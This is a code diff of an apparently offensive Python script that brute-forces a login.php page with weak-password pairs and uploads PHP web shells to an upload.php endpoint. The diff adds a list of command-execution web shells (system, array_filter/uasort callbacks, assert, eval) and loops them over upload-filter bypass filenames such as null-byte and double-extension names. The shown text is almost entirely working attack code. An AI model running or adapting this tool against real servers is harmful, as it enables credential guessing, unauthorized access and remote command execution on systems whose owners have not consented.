@@ -15,6 +15,7 @@ requests.adapters.DEFAULT_RETRIES = 0
 succes_count = 0
 fail_count = 0
 
+
 # proxy = {
 #     'http': 'http://127.0.0.1:8080'
 # }
@@ -62,14 +63,14 @@ def attackweakpasswd():
                 succes_count += 1
             except:
                 fail_count += 1
-            data = 'login_user=' + base64.encode(u) + '&login_password=' + base64.encode(
-                p) + '&mysubmit=%E7%99%BB%E5%BD%95'
+            data = 'login_user=' + str(base64.b64encode(u.encode('utf-8'))) + '&login_password=' + str(base64.b64encode(
+                p.encode('utf-8'))) + '&mysubmit=%E7%99%BB%E5%BD%95'
             try:
                 requests.post(url + "/login.php", headers=heads, data=data, verify=False, timeout=3)
                 succes_count += 1
             except:
                 fail_count += 1
-            heads['Authorization'] = base64.encode(u + ':' + p)
+            heads['Authorization'] = str(base64.b64encode((u + ':' + p).encode('utf-8')))
             try:
                 requests.post(url + "/login.php", headers=heads, verify=False, timeout=3)
                 succes_count += 1
@@ -110,15 +111,20 @@ def attackupload():
     files = {}
     file_nmae = ['test.php .jpg', 'test.pHp3.xxx', 'test.phtml', 'test.pht%00.jpg', 'test.pHp5', '.htaccess',
                  'test.pHp4%00.jpg', 'test.pht', 'test.pHp', 'test.html.xxx']
+    shell = [
+        "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';die;}?>",
+        "<?php $e = $_REQUEST['e'];$arr = array($_POST['pass'],);array_filter($arr, $e);?>",
+        "<?php $e = $_REQUEST['e'];$arr = array('test', $_REQUEST['pass']);uasort($arr, $e);?>",
+        "<?php filter_var_array( array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));?>",
+        "<?php $string=@$_POST['_']; eval('system('net user');');?>"]
     for f in file_nmae:
-        files['files'] = (f,
-                          "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';die;}?>",
-                          'application/octet-stream')
-        try:
-            requests.post(url + "/upload.php", headers=heads, files=files, verify=False, timeout=3)
-            succes_count += 1
-        except:
-            fail_count += 1
+        for s in shell:
+            files['files'] = (f, s, 'application/octet-stream')
+            try:
+                requests.post(url + "/upload.php", headers=heads, files=files, verify=False, timeout=3)
+                succes_count += 1
+            except:
+                fail_count += 1
 
 
 def attackxxe():
